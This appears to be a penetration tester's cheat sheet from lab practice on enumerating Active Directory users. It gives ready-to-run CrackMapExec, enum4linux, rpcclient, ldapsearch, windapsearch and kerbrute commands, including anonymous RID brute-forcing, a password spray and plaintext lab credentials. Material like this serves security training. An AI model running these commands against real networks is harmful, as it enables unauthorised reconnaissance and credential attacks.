#AD_user_enumeration

## **User Enumeration (`crackmapexec --rid-brute`)**

It tells **CrackMapExec**:

> “Try RID numbers from 500 to 5500 and give me usernames if any match.”

### Why This Works:

- In Active Directory, **each user and group has a unique ID** called a **RID** (Relative Identifier).
- These RIDs are just numbers (like 500 = Administrator, 501 = Guest, etc.)
- On many networks, **user RIDs start at 1000 and go up** — like 1001, 1002, etc.

So if you **try each RID**, you might "guess" real usernames even if enumeration is blocked.

```bash
# Tries to find usernames without any login (anonymous).
crackmapexec smb <target-ip> --rid-brute

# Tries to find usernames using the guest account (blank password).
crackmapexec smb <target-ip> -u guest -p  '' --rid-brute

# Show only actual user accounts (not computer names or groups).
crackmapexec smb <target-ip> -u guest -p  '' --rid-brute | grep SidTypeUser
```

___

# **NULL Session to Pull User List**

##### **Using enum4linux**

```bash
# Pulls user list via null session, extracts just usernames
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

enum4linux -a $t > enum4linux.txt # Full scan
enum4linux -u "guest" -p "" 10.10.180.201 # Test guest access
enum4linux -u thm.corp\\\\guest -a 10.10.130.147 # enumerating using the Guest account

enum4linux-ng -A fluffy.htb -u FLUFFY/j.fleischman -p 'J0elTHEM4n1990!'
```
##### **Using rpcclient**
```bash
# Opens null session RPC connection
rpcclient -U "" -N 172.16.5.5

# Lists all domain users (run inside rpcclient)
rpcclient $> enumdomusers
```
##### **Using CrackMapExec --users Flag**
```bash
# Lists users without credentials
crackmapexec smb 172.16.5.5 --users

# Lists all domain users using valid credentials
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

___
# **Gathering Users with LDAP Anonymous**
##### **Using ldapsearch**
```bash
# Searches for all user objects anonymously
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

ldapsearch -x -H ldap://$t -b "dc=htb,dc=support" > ldap_dump.txt
# then search for keyword "LegacyPwd" it maycontain password

# search for "info" keyword it is password sometime and the name is user
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldap.search

# Finding user 
nxc ldap $t -u '' -p '' --users
nxc ldap $t -u 'guest' -p '' --users
```
##### **Using windapsearch**
```bash
# Python tool for anonymous LDAP user enumeration
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

___
# **Enumerating Users with Kerbrute**

We will use the word-list [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) to enumerate users
```bash
# Enumerates valid users by checking Kerberos pre-authentication
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# bruteforcing the passwords for user ksimpson
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt ksimpson
```
